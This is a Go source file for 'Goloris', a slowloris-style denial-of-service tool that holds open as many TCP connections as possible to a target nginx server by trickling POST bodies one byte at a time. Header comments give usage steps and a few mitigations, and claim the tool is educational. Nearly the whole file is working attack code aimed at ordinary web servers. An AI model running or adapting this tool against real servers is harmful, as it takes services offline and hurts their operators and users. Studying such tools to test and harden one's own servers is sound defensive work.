// Goloris - slowloris[1] for nginx. Written in Go :)
//
// Q: How it works?
// A: It tries occupying and keeping busy as much tcp connections
// to the victim as possible by using as low network bandwidth as possible.
// If goloris is lucky enough, then eventually it should eat all available
// connections to the victim, so no other client could connect to it.
// See the source code for more insights.
//
// Q: How quickly it can take down unprotected nginx with default settings?
// A: In a few minutes with default config options.
//
// Q: How to protect nginx against goloris?
// A: I know the following options:
//    - Limit the number of simultaneous TCP connections from the same
//      source ip. See, for example, connlimit in iptables
//      or http://nginx.org/en/docs/http/ngx_http_limit_conn_module.html
//    - Deny POST requests.
//    - Patch nginx, so it drops connection if the client sends POST
//      body at very slow rate.
//
// Q: How to use it?
// A: go get -u -a github.com/valyala/goloris
//    go build github.com/valyala/goloris
//    ./goloris -help
//
//
// P.S. Don't forget adjusting `ulimit -n` before experimenting.
//
// And remember - goloris is published for educational purposes only.
//
// [1] http://ha.ckers.org/slowloris/
//
package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"runtime"
	"strings"
	"time"
)

var (
	contentLength    = flag.Int("contentLength", 1000*1000, "The maximum length of fake POST body in bytes. Adjust to client_max_body_size")
	dialWorkersCount = flag.Int("dialWorkersCount", 10, "The number of workers simultaneously busy with opening new TCP connections")
	goMaxProcs       = flag.Int("goMaxProcs", runtime.NumCPU(), "The maximum number of CPUs to use. Don't touch :)")
	rampUpInterval   = flag.Duration("rampUpInterval", time.Second, "Interval between new connections' acquisitions for a single dial workers (see dialWorkersCount)")
	sleepInterval    = flag.Duration("sleepInterval", 50*time.Second, "Sleep interval between subsequent packets sending. Adjust to client_body_timeout")
	testDuration     = flag.Duration("testDuration", time.Hour, "Test duration")
	victimUrl        = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url (must support http POST)")
)

var (
	sharedReadBuf  = make([]byte, 4096)
	sharedWriteBuf = []byte("A")
)

func main() {
	flag.Parse()

	fmt.Printf("contentLength=%d\n", *contentLength)
	fmt.Printf("dialWorkersCount=%d\n", *dialWorkersCount)
	fmt.Printf("goMaxProcs=%d\n", *goMaxProcs)
	fmt.Printf("rampUpInterval=%s\n", *rampUpInterval)
	fmt.Printf("sleepInterval=%s\n", *sleepInterval)
	fmt.Printf("testDuration=%s\n", *testDuration)
	fmt.Printf("victimUrl=%s\n", *victimUrl)

	runtime.GOMAXPROCS(*goMaxProcs)

	victimUri, err := url.Parse(*victimUrl)
	if err != nil {
		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", victimUrl, err)
	}
	victimHostPort := victimUri.Host
	if !strings.Contains(victimHostPort, ":") {
		victimHostPort = net.JoinHostPort(victimHostPort, "80")
	}
	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
		victimUri.RequestURI(), victimUri.Host, *contentLength))

	dialWorkersLaunchInterval := *rampUpInterval / time.Duration(*dialWorkersCount)
	activeConnectionsCh := make(chan int, *dialWorkersCount)
	go activeConnectionsCounter(activeConnectionsCh)
	for i := 0; i < *dialWorkersCount; i++ {
		go dialWorker(activeConnectionsCh, victimHostPort, victimUri, requestHeader)
		time.Sleep(dialWorkersLaunchInterval)
	}
	time.Sleep(*testDuration)
}

func dialWorker(activeConnectionsCh chan<- int, victimHostPort string, victimUri *url.URL, requestHeader []byte) {
	for {
		time.Sleep(*rampUpInterval)
		conn := dialVictim(victimHostPort)
		if conn == nil {
			continue
		}
		if _, err := conn.Write(requestHeader); err != nil {
			log.Printf("Error writing request header: [%s]\n", err)
			continue
		}
		activeConnectionsCh <- 1
		go doLoris(conn, victimUri, activeConnectionsCh)
	}
}

func activeConnectionsCounter(ch <-chan int) {
	var connectionsCount int
	for n := range ch {
		connectionsCount += n
		log.Printf("Holding %d connections\n", connectionsCount)
	}
}

func dialVictim(hostPort string) io.ReadWriteCloser {
	conn, err := net.Dial("tcp", hostPort)
	if err != nil {
		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", hostPort, err)
		return nil
	}
	tcpConn := conn.(*net.TCPConn)
	if err = tcpConn.SetReadBuffer(128); err != nil {
		log.Fatalf("Cannot shrink TCP read buffer: [%s]\n", err)
	}
	if err = tcpConn.SetWriteBuffer(128); err != nil {
		log.Fatalf("Cannot shrink TCP write buffer: [%s]\n", err)
	}
	if err = tcpConn.SetLinger(0); err != nil {
		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
	}
	return tcpConn
}

func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh chan<- int) {
	defer func() { activeConnectionsCh <- -1 }()
	defer conn.Close()
	readerStopCh := make(chan int, 1)
	go nullReader(conn, readerStopCh)
	for i := 0; i < *contentLength; i++ {
		select {
		case <-readerStopCh:
			return
		case <-time.After(*sleepInterval):
		}
		if _, err := conn.Write(sharedWriteBuf); err != nil {
			log.Printf("Error when writing byte number %d of out %d: [%s]\n", i, *contentLength, err)
			return
		}
	}
}

func nullReader(conn io.Reader, ch chan<- int) {
	defer func() { ch <- 1 }()
	n, err := conn.Read(sharedReadBuf)
	if err != nil {
		log.Printf("Error when reading HTTP response: [%s]\n", err)
	} else {
		log.Printf("Unexpected response read from server: [%s]\n", sharedReadBuf[:n])
	}
}
